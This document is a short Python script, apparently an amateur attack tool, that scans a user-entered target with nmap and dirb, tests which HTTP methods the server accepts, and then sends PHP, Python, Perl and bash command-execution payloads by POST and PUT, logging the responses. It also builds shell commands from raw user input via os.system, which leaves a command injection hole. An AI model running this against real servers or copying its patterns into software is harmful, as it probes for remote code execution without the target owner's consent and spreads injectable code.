import requests
import os

# Step 1: Manually enter the Target Address
target_url = input("Enter the target URL: ")

# Step 2: Open Port Scanner
def scan_ports(target_url):
    # Use a port scanning library or command line tool to scan ports
    # For example, using nmap:
    os.system(f"nmap {target_url}")

# Step 3: Scan the target's directories
def scan_directories(target_url):
    # Use a directory scanning library or command line tool
    # For example, using dirb:
    os.system(f"dirb {target_url}")

# Step 4: Check http commands other than GET
def check_http_methods(target_url):
    methods = ['POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
    allowed_methods = []
    for method in methods:
        response = requests.request(method, target_url)
        if response.status_code != 405:  # 405 Method Not Allowed
            allowed_methods.append(method)
    return allowed_methods

# Step 5: Send files or commands in different languages
def send_payloads(target_url, allowed_methods):
    payloads = {
        'php': "<?php system('ls'); ?>",
        'python': "import os\nos.system('ls')",
        'perl': "system('ls')",
        'bash': "ls"
    }
    results = []
    for method in allowed_methods:
        for lang, payload in payloads.items():
            response = None  # Inicializa response como None
            if method == 'POST':
                response = requests.post(target_url, data={lang: payload})
            elif method == 'PUT':
                response = requests.put(target_url, data={lang: payload})
            # Adiciona um controle para verificar se response foi definido
            if response:
                results.append((method, lang, response.text))
            else:
                results.append((method, lang, "No response received"))  # Mensagem ou tratamento de erro alternativo
    return results

# Step 6: Store the results
def store_results(results):
    with open('results.txt', 'w') as file:
        for result in results:
            file.write(f"{result[0]},{result[1]},{result[2]}\n")

# Main script
scan_ports(target_url)
directories = scan_directories(target_url)
allowed_methods = check_http_methods(target_url)
payload_results = send_payloads(target_url, allowed_methods)
store_results(payload_results)